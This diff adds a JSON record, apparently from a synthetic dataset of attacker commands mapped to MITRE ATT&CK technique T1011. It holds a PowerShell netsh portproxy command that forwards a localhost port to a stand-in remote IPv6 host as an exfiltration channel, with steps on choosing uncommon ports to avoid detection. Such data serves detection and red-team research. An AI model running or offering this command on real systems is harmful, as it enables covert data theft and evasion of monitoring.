@@ -1,0 +1,22 @@
+{
+  "technique_id": "T1011",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "netsh interface portproxy add v4tov6 listenaddress=127.0.0.1 listenport=49171 connectaddress=2001:db8:ac:1::beef connectport=49172",
+  "explanation": "Sets a v4-to-v6 port proxy from localhost to a remote IPv6 address on uncommon ports, allowing tools to exfiltrate over an IPv6 medium via a loopback entry point (T1011).",
+  "rationale_steps": [
+    "Expose a localhost IPv4 port that forwards to an IPv6 destination.",
+    "Use high, uncommon ports (49171/49172) to minimize detection.",
+    "Enable applications restricted to IPv4 to send data over IPv6 as an alternate channel."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1011-9788b456-eb5b681e",
+  "source_prompt_hash": "9788b456",
+  "timestamp_utc": "2025-09-30T08:11:11.119466Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
